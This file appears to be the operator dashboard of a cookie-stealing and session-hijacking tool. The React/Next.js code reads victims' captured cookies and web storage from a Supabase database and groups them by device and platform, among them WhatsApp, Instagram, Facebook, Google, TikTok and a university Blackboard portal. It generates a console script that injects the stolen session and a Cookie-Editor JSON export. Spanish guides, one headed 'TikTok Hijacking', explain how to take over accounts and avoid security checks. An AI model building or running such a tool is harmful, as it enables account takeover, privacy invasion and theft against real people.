"use client";

import React, { useEffect, useState } from "react";
import { supabase, SessionSnapshot, Cookie } from "@/lib/supabase";
import { 
  Search, Clock, Globe, ExternalLink, 
  Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy,
  Twitter, MessageSquare, Play, AlertCircle, Palette, Gamepad2, Mail, Bot, Monitor, Tablet, Smartphone, Info, RefreshCw, FileJson, Download,
  Youtube, Linkedin, ShoppingCart, HelpCircle, ChevronRight, X, Cpu, Trash2, Key, ArrowLeft, MousePointer2
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import Link from "next/link";
import { useParams } from "next/navigation";

export const runtime = 'edge';

interface AccountInfo {
  platform: string;
  identifier: string;
  icon: any;
  color: string;
  health: "active" | "expiring" | "expired";
  domain: string;
}

const RESTORATION_GUIDES: Record<string, { title: string, steps: string[], downloadLink?: string, warning?: string }> = {
  "WhatsApp": {
    title: "Deep Restore: WhatsApp Web",
    steps: [
      "PASO 1: Abre web.whatsapp.com en tu navegador.",
      "PASO 2: Presiona F12 y ve a la pestaña 'Console'.",
      "PASO 3: Haz clic en el botón azul gigante 'CONSOLE BOOT' hasta que diga '¡COPIADO!'.",
      "PASO 4: Pégalo en la consola de WhatsApp y presiona ENTER.",
      "PASO 5: La página se refrescará y entrarás automáticamente."
    ],
    warning: "Solo funciona en PC. No cierres la sesión en el celular original."
  },
  "Instagram": {
    title: "Session Injection: Instagram",
    steps: [
      "PASO 1: Instala la extensión 'Cookie-Editor' en Chrome.",
      "PASO 2: LIMPIEZA: Abre instagram.com y en Cookie-Editor haz clic en el ícono de basura (Delete All).",
      "PASO 3: USER-AGENT: Copia el 'User-Agent' abajo y aplícalo con 'User-Agent Switcher'.",
      "PASO 4: IMPORTAR: Usa 'EXPORT SESSION JSON', ve a Cookie-Editor -> Import y pega el código.",
      "PASO 5: Refresca instagram.com y listo."
    ],
    downloadLink: "https://chromewebstore.google.com/detail/cookie-editor/hlkenmcchncchcemhkaebachofncghba"
  },
  "Facebook": {
    title: "Session Control: Facebook",
    steps: [
      "PASO 1: Importa el JSON de cookies en facebook.com.",
      "PASO 2: Usa el User-Agent del dispositivo original (muy importante).",
      "PASO 3: Refresca la página; entrarás directo al inicio."
    ],
    downloadLink: "https://chromewebstore.google.com/detail/cookie-editor/hlkenmcchncchcemhkaebachofncghba"
  },
  "Google": {
    title: "Google Master Access (Gmail/Drive/YT)",
    steps: [
      "PASO 1: Importa las cookies JSON en google.com.",
      "PASO 2: Configura el User-Agent original.",
      "PASO 3: Entra a mail.google.com o drive.google.com.",
      "PASO 4: Si pide verificación, usa las cookies de YouTube/Facebook si están disponibles."
    ],
    warning: "Usa una VPN similar a la del nodo para evitar bloqueos por seguridad."
  },
  "Blackboard": {
    title: "Portal Académico: Blackboard",
    steps: [
      "PASO 1: Abre una pestaña en aulavirtual.up.edu.pe.",
      "PASO 2: Presiona F12 y ve a 'Console' o 'Consola'.",
      "PASO 3: Haz clic en el botón azul 'CONSOLE BOOT' y espera el mensaje '¡COPIADO!'.",
      "PASO 4: Ve a la pestaña de Blackboard, pega el script (Ctrl+V) y presiona ENTER.",
      "PASO 5: La página se limpiará sola y entrarás al sistema directamente."
    ],
    warning: "Es VITAL estar en la página de Blackboard al pegar el script."
  },
  "TikTok": {
     title: "TikTok Hijacking",
     steps: [
       "PASO 1: Importa cookies en tiktok.com.",
       "PASO 2: Usa el User-Agent original.",
       "PASO 3: Refresca la página."
     ]
  }
};

const formatRelativeTime = (date: string) => {
  const now = new Date();
  const captured = new Date(date);
  const diff = Math.floor((now.getTime() - captured.getTime()) / 1000);
  if (diff < 60) return "just now";
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  return captured.toLocaleDateString();
};

export default function DeviceControlCenter() {
  const params = useParams();
  const deviceId = params.id as string;
  const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedSession, setSelectedSession] = useState<SessionSnapshot | null>(null);
  const [cookies, setCookies] = useState<Cookie[]>([]);
  const [webStorage, setWebStorage] = useState<any[]>([]);
  const [accountMap, setAccountMap] = useState<Record<string, AccountInfo>>({});
  const [copied, setCopied] = useState(false);
  const [copiedJson, setCopiedJson] = useState(false);
  const [copiedUA, setCopiedUA] = useState(false);
  const [copiedStorage, setCopiedStorage] = useState(false);
  const [deviceSearch, setDeviceSearch] = useState("");

  const loadAll = async () => {
    setLoading(true);
    const { data: sData } = await supabase.from("session_snapshots").select("*").eq("device_id", deviceId).order("captured_at", { ascending: false });
    if (sData) {
      const sIds = sData.map(s => s.id);
      const { data: allC } = await supabase.from("cookies").select("snapshot_id, domain, name, value, expiration_date, path, http_only").in("snapshot_id", sIds);
      const { data: allS } = await supabase.from("web_storage").select("snapshot_id, domain, storage_type, key, value, db_name, store_name").in("snapshot_id", sIds);
      const newMap: Record<string, AccountInfo> = {};
      const ALLOWED = ["Instagram", "Facebook", "WhatsApp", "Blackboard", "Google", "TikTok"];
      sData.forEach(s => {
        const cs = (allC || []).filter(c => c.snapshot_id === s.id);
        const st = (allS || []).filter(st => st.snapshot_id === s.id);
        const ds = [...cs.map(c => c.domain), ...st.map(st => st.domain)];
        const dStr = ds.map(d => d.toLowerCase()).join(" ");
        let platform = "External"; let icon = Shield; let color = "text-blue-400"; let domain = "unknown.com";
        if (dStr.includes("whatsapp")) { platform="WhatsApp"; icon=MessageSquare; color="text-green-500"; domain="web.whatsapp.com"; }
        else if (cs.find(c => c.name === "ds_user_id")) { platform="Instagram"; icon=Instagram; color="text-pink-500"; domain="instagram.com"; }
        else if (cs.find(c => c.name === "c_user")) { platform="Facebook"; icon=Facebook; color="text-blue-500"; domain="facebook.com"; }
        else if (dStr.includes("up.edu.pe")) { platform="Blackboard"; icon=GraduationCap; color="text-blue-400"; domain="up.edu.pe"; }
        else if (dStr.includes("tiktok")) { platform="TikTok"; icon=Play; color="text-pink-400"; domain="tiktok.com"; }
        else if (dStr.includes("google")) { platform="Google"; icon=Globe; color="text-red-400"; domain="google.com"; }
        
        if (ALLOWED.includes(platform)) newMap[s.id] = { platform, icon, color, health: "active", domain, identifier: s.user_id };
      });
      const valid = sData.filter(s => newMap[s.id]);
      setAccountMap(newMap); setSessions(valid);
      if (valid.length > 0) handleSelect(valid[0]);
    }
    setLoading(false);
  };

  useEffect(() => { loadAll(); }, [deviceId]);

  const handleSelect = async (s: SessionSnapshot) => {
    setSelectedSession(s); setDeviceSearch("");
    const { data: c } = await supabase.from("cookies").select("*").eq("snapshot_id", s.id);
    const { data: st } = await supabase.from("web_storage").select("*").eq("snapshot_id", s.id);
    setCookies(c || []); setWebStorage(st || []);
  };

  const copyUA = () => { if (selectedSession) navigator.clipboard.writeText(selectedSession.user_agent || "").then(() => { setCopiedUA(true); setTimeout(()=>setCopiedUA(false), 3000); }); };
  
  const copyJson = () => {
    if (!selectedSession) return;
    const t = accountMap[selectedSession.id]?.domain.toLowerCase() || "";
    const filtered = cookies.filter(c => {
      const d = c.domain.toLowerCase();
      if (deviceSearch) return d.includes(deviceSearch.toLowerCase());
      if (t.includes("instagram")) return d.includes("instagram.com") || d.includes("facebook.com");
      return d.includes(t);
    });
    const f = filtered.map(c => {
      const isHostOnly = !c.domain.startsWith(".");
      return {
        domain: isHostOnly ? c.domain.replace(/^\./, "") : (c.domain.startsWith('.') ? c.domain : "." + c.domain),
        expirationDate: Math.floor(Date.now() / 1000) + 86400 * 90,
        hostOnly: isHostOnly,
        httpOnly: c.http_only,
        name: c.name,
        path: c.path || "/",
        sameSite: "no_restriction",
        secure: true,
        session: false,
        value: (c.value || "").replace(/^"|"$/g, "").replace(/\\([0-7]{3})/g, (m, o) => String.fromCharCode(parseInt(o, 8)))
      };
    });
    navigator.clipboard.writeText(JSON.stringify(f, null, 2)).then(() => { setCopiedJson(true); setTimeout(() => setCopiedJson(false), 5000); });
  };

  const copyConsole = () => {
    const ls = webStorage.filter(s => s.storage_type === 'localstorage');
    const ss = webStorage.filter(s => s.storage_type === 'sessionstorage');
    const s = `(function(){
      const c=${JSON.stringify(cookies)};
      const ls=${JSON.stringify(ls)};
      const ss=${JSON.stringify(ss)};
      console.log('Restaurando sesión completa...');
      // Limpiar cookies
      document.cookie.split(";").forEach(x=>{const n=x.split("=")[0].trim();document.cookie=n+"=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;domain="+location.hostname;document.cookie=n+"=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;domain=."+location.hostname});
      // Inyectar Cookies
      c.forEach(x=>{document.cookie=x.name+"="+x.value+";domain="+(x.domain.startsWith('.')?x.domain:'.'+x.domain)+";path="+(x.path||"/")+";SameSite=Lax;Secure"});
      // Inyectar Storage
      ls.forEach(x=>{try{localStorage.setItem(x.key,x.value)}catch(e){}});
      ss.forEach(x=>{try{sessionStorage.setItem(x.key,x.value)}catch(e){}});
      console.log('Completado. Recargando...');
      setTimeout(()=>location.reload(),1000);
    })()`;
    navigator.clipboard.writeText(s).then(() => { setCopied(true); setTimeout(() => setCopied(false), 5000); });
  };

  const guide = selectedSession ? RESTORATION_GUIDES[accountMap[selectedSession.id]?.platform] : null;

  return (
    <div className="min-h-screen bg-[#050505] text-white flex overflow-hidden">
        <aside className="w-[400px] border-r border-white/5 bg-black/40 flex flex-col">
          <div className="p-10 border-b border-white/5 space-y-8">
            <Link href="/" className="px-4 py-2 bg-blue-500/10 text-blue-400 text-[10px] font-black uppercase rounded-lg border border-blue-500/20 inline-flex items-center gap-2 shadow-lg"><ArrowLeft size={14}/> Regresar</Link>
            <div className="flex items-center gap-5">
              <div className="w-14 h-14 bg-blue-500/20 rounded-2xl flex items-center justify-center text-blue-400 border border-blue-500/10"><Monitor size={28}/></div>
              <h2 className="text-xl font-black uppercase tracking-tight truncate">{sessions.length>0?sessions[0].pc_name:"Cargando..."}</h2>
            </div>
          </div>
          <div className="flex-1 overflow-y-auto p-6 space-y-4 custom-scrollbar">
            {loading ? <p>Cargando sesiones...</p> : 
             sessions.map(s => (
               <button key={s.id} onClick={()=>handleSelect(s)} className={`w-full text-left p-6 rounded-[2rem] border transition-all ${selectedSession?.id===s.id?'bg-blue-600 border-blue-500 shadow-xl':'bg-white/[0.02] border-white/5'}`}>
                 <div className="flex items-center gap-4">
                   <div className="p-3 bg-black/30 rounded-xl">{React.createElement(accountMap[s.id]?.icon || Shield, { size: 20, className: selectedSession?.id===s.id? 'text-white' : accountMap[s.id]?.color })}</div>
                   <div><p className="font-black text-xs uppercase tracking-wider">{accountMap[s.id]?.platform}</p><p className="text-[9px] text-gray-500 font-bold uppercase">{formatRelativeTime(s.captured_at)}</p></div>
                 </div>
               </button>
             ))}
          </div>
        </aside>

        <main className="flex-1 overflow-y-auto p-12 custom-scrollbar bg-[#050505]">
          <AnimatePresence mode="wait">
            {selectedSession && (
              <motion.div key={selectedSession.id} initial={{opacity:0,y:20}} animate={{opacity:1,y:0}} className="space-y-12">
                <div className="flex items-center justify-between border-b border-white/5 pb-10">
                   <div className="flex items-center gap-8">
                      <div className={`w-24 h-24 rounded-[2rem] bg-black/60 border border-white/10 flex items-center justify-center ${accountMap[selectedSession.id]?.color}`}>{React.createElement(accountMap[selectedSession.id]?.icon || Shield, { size: 48 })}</div>
                      <div><h1 className="text-5xl font-black uppercase tracking-tighter">{accountMap[selectedSession.id]?.platform}</h1><p className="text-blue-400 font-black text-sm uppercase tracking-widest">{accountMap[selectedSession.id]?.domain}</p></div>
                   </div>
                   <div className="p-6 bg-white/[0.02] rounded-3xl border border-white/5 text-center"><p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-1">DATA NODES</p><p className="text-3xl font-black">{cookies.length}</p></div>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
                   <div className="space-y-8">
                      <div className="glass-intense p-10 rounded-[3rem] border border-white/10 bg-white/[0.02] space-y-6">
                         <h3 className="text-xl font-black uppercase tracking-widest text-blue-400 flex items-center gap-3"><List size={20}/> Manual detallado</h3>
                         {guide && (
                           <div className="space-y-6">
                              {guide.steps.map((st, i)=>(<div key={i} className="flex gap-4 items-start"><div className="w-6 h-6 rounded-full bg-blue-500/20 text-blue-400 flex items-center justify-center text-[10px] font-black shrink-0">{i+1}</div><p className="text-xs font-bold text-gray-300 leading-relaxed">{st}</p></div>))}
                              {guide.downloadLink && <Link href={guide.downloadLink} target="_blank" className="w-full py-4 rounded-xl bg-white/5 text-[10px] font-black uppercase text-blue-400 text-center block border border-white/5">Descargar Cookie-Editor</Link>}
                              {guide.warning && <div className="p-4 bg-red-500/5 rounded-2xl flex gap-3 text-red-500 text-[9px] font-black uppercase"><AlertCircle size={16}/><p>{guide.warning}</p></div>}
                           </div>
                         )}
                      </div>
                      <div className="grid grid-cols-2 gap-6">
                        <button onClick={copyUA} className="p-6 rounded-[2rem] bg-white/[0.02] border border-white/5 flex flex-col items-center gap-2 transition-all active:scale-95"><Cpu size={20} className="text-gray-500"/><span className="text-[9px] font-black uppercase tracking-widest">{copiedUA?'¡COPIADO!':'COPIAR UA'}</span></button>
                        <button onClick={copyJson} className="p-6 rounded-[2rem] bg-indigo-500/10 border border-indigo-500/20 flex flex-col items-center gap-2 transition-all active:scale-95"><FileJson size={20} className="text-indigo-400"/><span className="text-[9px] font-black uppercase tracking-widest text-indigo-400">{copiedJson?'¡COPIADO!':'EXPORTAR JSON'}</span></button>
                      </div>
                   </div>
                   <div className="space-y-8">
                      <button onClick={copyConsole} className={`w-full py-12 rounded-[3.5rem] text-2xl font-black shadow-xl transition-all active:scale-95 flex flex-col items-center gap-2 ${copied ? 'bg-emerald-600' : 'bg-blue-600 hover:bg-blue-500 shadow-blue-500/30'}`}>
                         <div className="flex items-center gap-3"><MousePointer2 size={24}/> {copied ? '¡COPIADO AL PORTAPAPELES!' : 'CONSOLE BOOT'}</div>
                         <span className="text-[9px] uppercase tracking-widest opacity-40 italic">{copied ? 'Listo para pegar (Ctrl+V)' : 'Haz clic para copiar el Script de Inyección'}</span>
                      </button>
                      <div className="glass-intense p-8 rounded-[3rem] border border-white/10 bg-black/40 h-[300px] flex flex-col">
                        <p className="text-[10px] font-black text-emerald-400 uppercase tracking-widest mb-4">Evidencia de Cookies</p>
                        <div className="flex-1 overflow-y-auto space-y-2 custom-scrollbar">
                           {cookies.slice(0, 50).map((c,i)=>(<div key={i} className="p-3 bg-white/[0.02] rounded-xl border border-white/5 flex justify-between items-center text-[9px] font-mono text-white/30 truncate hover:border-emerald-500/30"><span>{c.domain}</span><span>{c.name}</span></div>))}
                        </div>
                      </div>
                   </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </main>
    </div>
  );
}
